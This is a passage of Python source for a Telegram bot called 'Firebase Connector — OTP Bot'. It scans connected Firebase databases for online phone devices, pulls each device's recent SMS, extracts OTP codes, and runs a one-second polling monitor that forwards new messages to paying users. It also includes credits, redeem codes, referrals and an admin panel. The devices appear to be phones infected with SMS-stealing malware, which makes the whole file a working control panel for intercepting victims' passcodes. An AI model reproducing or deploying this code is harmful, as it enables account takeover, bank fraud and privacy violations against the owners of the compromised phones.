            if idx < 0 or idx >= len(global_fb_list): await q.answer("Invalid Firebase.", show_alert=True); return
            removed = global_fb_list.pop(idx); _retag_global_firebases(); _save_global_firebases()
            await q.edit_message_text(f"🗑 *Deleted*\n\nRemoved: `{removed[1]}`\nRemaining: {len(global_fb_list)}/{MAX_FIREBASES}", parse_mode="Markdown", reply_markup=admin_firebases_kb(0))
        except Exception as e: logger.error("admin_fb_delete: %s", e); await q.answer("Delete failed.", show_alert=True)
        return

    if data.startswith("admin_fb_info:"):
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(global_fb_list): await q.answer("Invalid Firebase.", show_alert=True); return
            url, tag = global_fb_list[idx]; per_fb = global_device_cache.get("per_fb", {}) or {}; counts = per_fb.get(tag) or {}
            online = int(counts.get("online", 0)); offline = int(counts.get("offline", 0))
            await q.edit_message_text(f"📋 *{tag}*\n\n🟢 Online: `{online}`\n🔴 Offline: `{offline}`\n📊 Total: `{online + offline}`\n🕒 `{global_device_cache.get('updated_at', '')}`", parse_mode="Markdown", reply_markup=admin_firebases_kb(0))
        except Exception as e: logger.error("admin_fb_info: %s", e); await q.answer("Load failed.", show_alert=True)
        return

    if data == "admin_channels":
        if REQUIRED_CHANNELS: lines = ["📋 *Force-Join Channels*\n"] + [f"{i}. `{c.get('label', c.get('id'))}`" for i, c in enumerate(REQUIRED_CHANNELS, 1)]; text = "\n".join(lines)
        else: text = "📋 *Force-Join Channels*\n\nNo channels configured."
        await q.edit_message_text(text, parse_mode="Markdown", reply_markup=admin_channels_kb()); return

    if data == "admin_add_channel": context.user_data["admin_action"] = "add_channel"; await q.edit_message_text("➕ *Add Force-Join Channel/Group*\n\n**1. Public Channel:**\nSend: `@channelusername`\n\n**2. Private Group:**\nSend: `Name | ChatID | InviteLink`\nExample: `My VIP Group | -1001234567890 | https://t.me/+AbCdEfGh`\n\n⚠️ *Bot must be Admin in the private group!*", parse_mode="Markdown", reply_markup=admin_back_kb()); return
    if data == "admin_broadcast": context.user_data["admin_action"] = "broadcast"; await q.edit_message_text("📢 *Broadcast*\n\nSend broadcast message.", parse_mode="Markdown", reply_markup=admin_back_kb()); return

    if data.startswith("admin_remove_channel:"):
        try:
            index = int(data.split(":", 1)[1]); removed = REQUIRED_CHANNELS.pop(index); _save_required_channels()
            await q.edit_message_text(f"✅ Removed: `{removed.get('label', removed.get('id'))}`", parse_mode="Markdown", reply_markup=admin_channels_kb())
        except (ValueError, IndexError): await q.answer("Invalid channel.", show_alert=True)
        return

# ============================================================
# SMS VIEW (Last 5 SMS)
# ============================================================
async def _show_sms_safe(q, info: dict, device_id: str, updated_at: Optional[str] = None):
    fb_url = info.get("fb_url", ""); real_cid = info.get("real_cid", device_id); tag = info.get("fb_tag", "?")
    if not fb_url:
        parsed_tag, parsed_cid = _parse_prefixed(device_id); fb_url = _find_fb_url_by_tag(q.from_user.id, parsed_tag)
        if not fb_url:
            await _safe_edit_callback_message(q, "❌ *Device info missing.*\n\nPlease tap REFRESH.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 REFRESH", callback_data="scan_active")], [InlineKeyboardButton("🎲 GENERATE AGAIN", callback_data="generate_number")]]))
            return
        real_cid = parsed_cid; tag = parsed_tag
    try: await _safe_edit_callback_message(q, "⏳ Fetching SMS...")
    except: pass
    pairs = await fetch_last_sms(fb_url, real_cid, limit=FB_MESSAGES_LIMIT)
    if not pairs:
        await _safe_edit_callback_message(q, f"📭 *No SMS records found.*\n\n🌐 Firebase: `{tag}`\n📱 Device: `{real_cid}`", parse_mode="Markdown", reply_markup=sms_view_kb(device_id)); return
    lines = [f"📩 LAST {len(pairs)} SMS", "", "━━━━━━━━━━━━━━━━━━━━━━━", f"🌐 Firebase: {tag}", f"📱 Device: {real_cid}", "━━━━━━━━━━━━━━━━━━━━━━━"]
    circled_numbers = ("①", "②", "③", "④", "⑤")
    for i, (ts_key, m) in enumerate(pairs, 1):
        sender = _extract_msg_sender(m); body = _extract_msg_body(m); when = _extract_msg_time(m, ts_key); otp = _extract_otp(body)
        if not body: body = "(no body)"
        number_label = circled_numbers[i - 1] if i <= len(circled_numbers) else f"{i}."
        if i > 1: lines.append("━━━━━━━━━━━━━━━━━━━━━━━")
        lines.extend(["", f"{number_label} ᴅᴇᴠɪᴄᴇ ɴᴀᴍᴇ: {sender}", f"⏱️ ᴛɪᴍᴇ: {when}", "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️", f"{_otp_short_message(sender, body)}"])
        if otp: lines.append(f"🔑 ᴏᴛᴘ: <code>{otp}</code>")
    if updated_at: lines.extend(["", "━━━━━━━━━━━━━━━━━━━━━━━", "𝗨𝗽𝗱𝗮𝘁𝗲𝗱", "━━━━━━━━━━━━━━━━━━━━━━━"])
    text = "\n".join(lines)
    if len(text) > 3800: text = text[:3800] + "\n\n... (truncated - too many SMS)"
    await _safe_edit_callback_message(q, text, parse_mode="Markdown", reply_markup=sms_view_kb(device_id))

# ============================================================
# MENU CALLBACK
# ============================================================
async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    if q.data == "force_verify": await force_verify_callback(update, context); return
    if q.data == "redeem_code":
        if not await _require_access(update, context, edit_target=q.message): return
        context.user_data["awaiting_redeem"] = True
        await _safe_edit_callback_message(q, _bold_blockquote("🎟 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘\n\nSend your code below.\nExample: `OTP-A1B2C3D4`"), parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[styled_button("🔙 𝗕𝗔𝗖𝗞", "menu_back", "danger")]]))
        return
    if not await _require_access(update, context, edit_target=q.message):
        uid_check = q.from_user.id
        if uid_check in sms_monitor_state and uid_check not in ADMIN_IDS: stop_sms_monitor(uid_check)
        return
    uid = q.from_user.id; touch_sms_monitor(uid); data = q.data; sess = user_sessions.get(uid)
    if not sess: await q.edit_message_text("⚠️ Session expired.\n\nSend /start again.", reply_markup=connect_inline_kb()); return

    if data == "manage_firebase": context.user_data["awaiting_url"] = False; sess["awaiting_fb_add"] = False; await q.edit_message_text(f"🔗 *Manage Firebase*\n\nConnected: {len(sess.get('fb_list', []))}/{MAX_FIREBASES}\nChoose an action:", parse_mode="Markdown", reply_markup=manage_fb_kb(uid)); return
    if data == "menu_back":
        stop_sms_monitor(uid); context.user_data["awaiting_url"] = False; sess["awaiting_fb_add"] = False
        if not sess.get("fb_list"): await q.edit_message_text("Hii 👋\n\nWelcome to Firebase Connector", reply_markup=connect_inline_kb()); return
        await q.edit_message_text(f"🔗 *Connected Firebase*\n\n📊 Total: {len(sess['fb_list'])}/{MAX_FIREBASES}\n\nTap a Firebase to fetch online devices.", parse_mode="Markdown", reply_markup=manage_fb_kb(uid)); return
    if data == "scan_active": stop_sms_monitor(uid); await q.edit_message_text("⏳ Scanning online devices..."); await scan_and_show(update, context, edit_target=q.message); return
    if data == "device_list":
        current_device = sess.get("current_device")
        if current_device: await _show_device_view(q, sess, current_device)
        else:
            if not sess.get("devices"): await q.answer("No cached scan. Refreshing...", show_alert=False); await scan_and_show(update, context, edit_target=q.message); return
            if len(sess.get("devices", {})) <= 1: await q.edit_message_text("⏳ Scanning online devices..."); await scan_and_show(update, context, edit_target=q.message); return
            await _show_cached_device_list(q, sess)
        return
    if data.startswith("scan_fb:"):
        stop_sms_monitor(uid)
        try:
            idx = int(data.split(":", 1)[1])
            if idx < 0 or idx >= len(sess.get("fb_list", [])): await q.answer("Invalid Firebase.", show_alert=True); return
            await q.edit_message_text("⏳ Scanning this Firebase..."); await scan_and_show(update, context, edit_target=q.message, fb_idx=idx)
        except: pass
        return
    if data.startswith("delete_fb:"):
        try:
            idx = int(data.split(":", 1)[1]); fb_list = sess.get("fb_list", [])
            if idx < 0 or idx >= len(fb_list): await q.answer("Invalid Firebase.", show_alert=True); return
            removed = fb_list.pop(idx); fb_list = [(url, f"FB{i+1}") for i, (url, _) in enumerate(fb_list)]
            sess["fb_list"] = fb_list; sess["active_fb_idx"] = min(sess.get("active_fb_idx", 0), max(0, len(fb_list) - 1)); sess["devices"] = {}; stop_sms_monitor(uid)
            await q.edit_message_text(f"🗑️ *Firebase Deleted*\n\nRemoved: `{removed[1]}`\nRemaining: {len(fb_list)}/{MAX_FIREBASES}", parse_mode="Markdown", reply_markup=manage_fb_kb(uid) if fb_list else connect_inline_kb())
        except: pass
        return
    if data.startswith("fbnoop:"):
        try:
            idx = int(data.split(":", 1)[1]); fb_list = sess.get("fb_list", [])
            if 0 <= idx < len(fb_list):
                sess["active_fb_idx"] = idx; await q.answer(f"Opening {fb_list[idx][1]}..."); await q.edit_message_text(f"⏳ Scanning {fb_list[idx][1]} for online devices...", parse_mode="Markdown"); await scan_and_show(update, context, edit_target=q.message, fb_idx=idx)
            else: await q.answer("Invalid Firebase.", show_alert=True)
        except: pass
        return
    if data == "noop": await q.answer(f"Page {sess.get('device_page', 0)+1}"); return
    if data.startswith("devpage:"):
        try:
            page = int(data.split(":", 1)[1]); devices = sess.get("devices", {}); items = list(devices.items())[:80]
            total_pages = max(1, (len(items) + DEVICES_PER_PAGE - 1) // DEVICES_PER_PAGE)
            if page < 0 or page >= total_pages: await q.answer("Invalid page.", show_alert=True); return
            sess["device_page"] = page; await _show_cached_device_list(q, sess)
        except: pass
        return
    if data.startswith("dev:"):
        device_id = data.split(":", 1)[1]; await _show_device_view(q, sess, device_id); return
    if data.startswith("sms_refresh:") or data.startswith("sms:"):
        device_id = data.split(":", 1)[1]; info = sess.get("devices", {}).get(device_id, {})
        if not info:
            parsed_tag, parsed_cid = _parse_prefixed(device_id); fb_url = _find_fb_url_by_tag(uid, parsed_tag)
            if fb_url: info = {"fb_url": fb_url, "fb_tag": parsed_tag, "real_cid": parsed_cid, "phone": "", "online": True, "raw": {}}; sess.setdefault("devices", {})[device_id] = info
            else: await q.answer("Device not found. Please REFRESH.", show_alert=True); return
        if data.startswith("sms_refresh:"): sess.setdefault("sms_last_updated", {})[device_id] = datetime.now().strftime("%I:%M %p")
        updated_at = sess.get("sms_last_updated", {}).get(device_id); await _show_sms_safe(q, info, device_id, updated_at=updated_at); return
    if data.startswith("smsmon_stop:"): stop_sms_monitor(uid); device_id = data.split(':', 1)[1]; await _show_device_view(q, sess, device_id); return
    if data.startswith("smsmon:"):
        device_id = data.split(":", 1)[1]; info = sess.get("devices", {}).get(device_id, {})
        if not info:
            parsed_tag, parsed_cid = _parse_prefixed(device_id); fb_url = _find_fb_url_by_tag(uid, parsed_tag)
            if fb_url: info = {"fb_url": fb_url, "fb_tag": parsed_tag, "real_cid": parsed_cid, "phone": "", "online": True, "raw": {}}; sess.setdefault("devices", {})[device_id] = info
            else: await q.answer("Device not found.", show_alert=True); return
        phone = info.get("phone") or "N/A"; stop_sms_monitor(uid); baseline_fingerprints = set()
        try: baseline_pairs = await fetch_last_sms(info.get("fb_url", ""), info.get("real_cid", device_id), limit=50); baseline_fingerprints = {_msg_fingerprint(key, message) for key, message in baseline_pairs}
        except: pass
        start_sms_monitor(context.bot, uid, q.message.chat_id, device_id, baseline_fingerprints=baseline_fingerprints, fb_url=info.get("fb_url", ""))
        await q.edit_message_text("📨 *SMS Monitor Started*\n\n" f"📱 *Device:* `{info.get('real_cid', device_id)}`\n" f"📞 *Number:* `{phone}`\n\n" "⏱️ *Duration:* 5 minutes\n" "⚡ *Speed:* 1 sec polling\n\n" "🔔 Every new SMS will be forwarded here.", parse_mode="Markdown", reply_markup=sms_monitor_kb(device_id))
        state = sms_monitor_state.get(uid)
        if state is not None: state["monitor_message_id"] = q.message.message_id
        return

# ============================================================
# SCAN HELPER
# ============================================================
async def scan_and_show(update, context, edit_target=None, fb_idx=None):
    uid = update.effective_user.id; sess = user_sessions.get(uid)
    if not sess or not sess.get("fb_list"):
        if edit_target: await edit_target.edit_text("⚠️ No Firebase connected. Send /start.")
        return
    if fb_idx is not None: sess["active_fb_idx"] = fb_idx
    prefetched = sess.pop("prefetched", {})
    devices_task = fetch_devices_all_firebases(sess["fb_list"], only_online=True, prefetched=prefetched)
    counts_task = fetch_counts_all_firebases(sess["fb_list"], prefetched=prefetched)
    devices, (online_count, offline_count, per_fb) = await asyncio.gather(devices_task, counts_task)
    online_count = len(devices); total_count = online_count + offline_count
    sess["devices"] = devices; sess["mode"] = "online"; sess["device_page"] = 0; sess["online_count"] = online_count; sess["offline_count"] = offline_count; sess["total_count"] = total_count
    text = (f"📞 *DEVICES INFO*\n\n" f"🟢 ONLINE : {online_count}\n" f"🔴 OFFLINE : {offline_count}\n" f"📊 TOTAL : {total_count}\n" f"🔗 Firebase: {len(sess['fb_list'])}\n\n" "Tap a device below.")
    markup = (device_list_kb(devices, mode="online", page=0) if devices else firebase_connected_kb(uid))
    if edit_target: await edit_target.edit_text(text, parse_mode="Markdown", reply_markup=markup)
    else: await update.effective_message.reply_text(text, parse_mode="Markdown", reply_markup=markup)

# ============================================================
# MAINTENANCE LOOP
# ============================================================
async def _maintenance_loop(bot):
    loop_count = 0
    while True:
        try:
            await asyncio.sleep(ACCESS_CHECK_INTERVAL); loop_count += 1
            if loop_count % max(1, CLEANUP_INTERVAL // ACCESS_CHECK_INTERVAL) == 0: gc.collect()
            for uid, task in list(sms_monitor_tasks.items()):
                if task.done(): sms_monitor_tasks.pop(uid, None)
            for uid, task in list(admin_panel_live_tasks.items()):
                if task.done(): admin_panel_live_tasks.pop(uid, None)
            for uid in list(sms_monitor_state.keys()):
                if uid in ADMIN_IDS: continue
                rec = _ensure_user_record(uid)
                if rec.get("suspended", False):
                    stop_sms_monitor(uid)
                    try: await bot.send_message(chat_id=uid, text=_bold_blockquote("⛔ 𝗠𝗢𝗡𝗜𝗧𝗢𝗥 𝗦𝗧𝗢𝗣𝗣𝗘𝗗\n\n⚠️ 𝗔𝗰𝗰𝗼𝘂𝗻𝘁 𝗦𝘂𝘀𝗽𝗲𝗻𝗱𝗲𝗱.\n\n📌 𝗦𝗲𝗻𝗱 /start 𝘁𝗼 𝗿𝗲𝘀𝘁𝗮𝗿𝘁."), parse_mode="HTML", reply_markup=connect_inline_kb())
                    except: pass
            if REQUIRED_CHANNELS:
                for uid in list(known_users):
                    joined, missing = await _check_required_channels(bot, uid)
                    previous = user_access_state.get(uid); user_access_state[uid] = joined
                    if previous is True and not joined:
                        verified_access_users.discard(uid)
                        if uid in sms_monitor_state and uid not in ADMIN_IDS: stop_sms_monitor(uid)
                        try: await bot.send_message(chat_id=uid, text=_bold_blockquote("⚠️ 𝗔𝗖𝗖𝗘𝗦𝗦 𝗥𝗘𝗦𝗧𝗥𝗜𝗖𝗧𝗘𝗗\n\n📌 𝗥𝗲𝗮𝘀𝗼𝗻 : Channel Leave\n\n🔗 𝗥𝗲𝗷𝗼𝗶𝗻 𝗮𝗹𝗹 𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘀 𝘁𝗼 𝗰𝗼𝗻𝘁𝗶𝗻𝘂𝗲."), parse_mode="HTML", reply_markup=_force_join_kb())
                        except: pass
        except asyncio.CancelledError: raise
        except Exception as e: logger.error(f"maintenance: {e}")

# ============================================================
# AUTO BACKUP LOOP (3 HOURS)
# ============================================================
async def auto_backup_loop(bot):
    while True:
        try:
            await asyncio.sleep(10800) # 3 hours
            json_files = ["force_join_channels.json", "bot_users.json", "maintenance_mode.json", "global_firebases.json", "global_devices_cache.json", "captcha_state.json", "referrals.json", "bot_config.json", "redeem_codes.json"]
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in json_files:
                    if os.path.exists(file): zipf.write(file)
            zip_buffer.seek(0); dt_str = datetime.now().strftime('%d-%m_%H-%M')
            await bot.send_document(chat_id=ADMIN_IDS[0], document=zip_buffer, filename=f"auto_backup_{dt_str}.zip", caption=f"📦 **Auto Backup (3 Hours)**\n\n⏰ Time: {datetime.now().strftime('%d-%m-%Y %I:%M %p')}\n💾 Data safe!")
            logger.info("✅ 3-hourly backup sent to admin!")
        except asyncio.CancelledError: raise
        except Exception as e: logger.error(f"Auto backup failed: {e}")

# ============================================================
# SHUTDOWN
# ============================================================
async def _post_stop(app):
    for task in list(sms_monitor_tasks.values()):
        if not task.done(): task.cancel()
    if sms_monitor_tasks: await asyncio.gather(*sms_monitor_tasks.values(), return_exceptions=True)
    sms_monitor_tasks.clear(); sms_monitor_state.clear()
    for task in list(admin_panel_live_tasks.values()):
        if not task.done(): task.cancel()
    if admin_panel_live_tasks: await asyncio.gather(*admin_panel_live_tasks.values(), return_exceptions=True)
    admin_panel_live_tasks.clear()
    logger.info("Monitor loops cancelled.")

async def _telegram_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    error = context.error
    logger.error("telegram handler error update=%s: %s", type(update).__name__, error, exc_info=(type(error), error, error.__traceback__) if error else None)

# ============================================================
# MAIN
# ============================================================
def main():
    global bot_instance
    print("=" * 60)
    print("  Firebase Connector — OTP Bot FINAL")
    print(f"  Max Firebases: {MAX_FIREBASES}")
    print(f"  Global FBs: {len(global_fb_list)}")
    print(f"  Force-join: {len(REQUIRED_CHANNELS)}")
    print(f"  Captcha: {'ON' if captcha_enabled else 'OFF'}")
    print(f"  Referral: 1 refer = {REFERRAL_CREDITS} credits")
    print(f"  SMS Monitor idle timeout: {SMS_MONITOR_IDLE_TIMEOUT // 60} minutes")
    print("=" * 60)

    app = Application.builder().token(BOT_TOKEN).build()
    bot_instance = app.bot

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("admin", admin_cmd))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern=r"^admin_(back|stats|channels|add_channel|add_firebase|manage_fb|broadcast|toggle_maintenance|toggle_captcha|remove_channel:\d+|fb_refresh:\d+|fb_delete:\d+|fb_info:\d+|fb_page:\d+|remove_dead_fb|bulk_remove_fb|noop_fb|gift_access|gift_single|gift_all|check_user|change_credit|credit_all|deduct_all|suspend|unsuspend|set_ref_credits|backup_now|bulk_add_fb|set_daily|gen_redeem)$"))
    app.add_handler(CallbackQueryHandler(generate_number_callback, pattern="^generate_number$"))
    app.add_handler(CallbackQueryHandler(menu_callback, pattern=r"^(device_list|menu_back|dev:.+|sms_refresh:.+|sms:.+|smsmon:.+|smsmon_stop:.+|force_verify|scan_active|scan_fb:\d+|delete_fb:\d+|fbnoop:\d+|noop|devpage:\d+|manage_firebase|redeem_code)$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE, text_router))
    app.add_error_handler(_telegram_error_handler)

    async def _post_init(application):
        global bot_instance, BOT_USERNAME
        bot_instance = application.bot
        try:
            me = await application.bot.get_me(); BOT_USERNAME = me.username or "YourBot"
            logger.info("Bot username cached: @%s", BOT_USERNAME)
        except Exception as exc:
            logger.warning("could not cache bot username: %s", exc); BOT_USERNAME = "YourBot"
        application.bot_data["maintenance_task"] = asyncio.create_task(_maintenance_loop(application.bot))
        application.bot_data["device_refresh_task"] = asyncio.create_task(_global_device_refresh_loop())
        application.bot_data["backup_task"] = asyncio.create_task(auto_backup_loop(application.bot))

    async def _post_stop_with_cleanup(application):
        for task_name in ("maintenance_task", "device_refresh_task", "backup_task"):
            task = application.bot_data.pop(task_name, None)
            if task and not task.done():
                task.cancel(); await asyncio.gather(task, return_exceptions=True)
        await _post_stop(application)

    app.post_init = _post_init
    app.post_shutdown = _post_stop_with_cleanup
    print("Bot running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__ == "__main__":
    main()